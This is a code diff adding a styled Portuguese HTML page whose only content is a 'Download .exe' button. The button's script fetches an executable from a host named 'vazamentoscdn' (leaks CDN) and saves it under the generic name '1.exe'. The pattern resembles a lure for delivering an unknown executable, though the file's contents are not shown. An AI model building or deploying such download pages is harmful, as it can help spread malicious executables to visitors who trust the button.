@@ -1,10 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Botão de Download</title>
+    <style>
+        :root {
+            --main-bg-color: linear-gradient(135deg, #2c3e50, #4ca1af);
+            --container-bg-color: rgba(255, 255, 255, 0.9);
+            --button-color: #212121;
+            --button-hover-color: #424242;
+            --button-active-color: #616161;
+        }
+
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--main-bg-color);
+            font-family: 'Arial', sans-serif;
+        }
+
+        .container {
+            text-align: center;
+            background: var(--container-bg-color);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .button {
+            display: inline-block;
+            padding: 15px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            color: #fff;
+            background-color: var(--button-color);
+            border: none;
+            border-radius: 30px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: var(--button-hover-color);
+            transform: scale(1.05);
+        }
+
+        .button:active {
+            background-color: var(--button-active-color);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            transform: scale(0.95);
+        }
+    </style>
 </head>
 <body>
-    
+    <div class="container">
+        <button class="button" onclick="downloadFile()">Baixar .exe</button>
+    </div>
+    <script>
+        function downloadFile() {
+            const link = document.createElement("a");
+            link.href = "https://vazamentoscdn.github.io/cdn/looser.exe"; // Substitua pelo link correto do arquivo .exe
+            link.download = "1.exe";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+    </script>
 </body>
 </html>
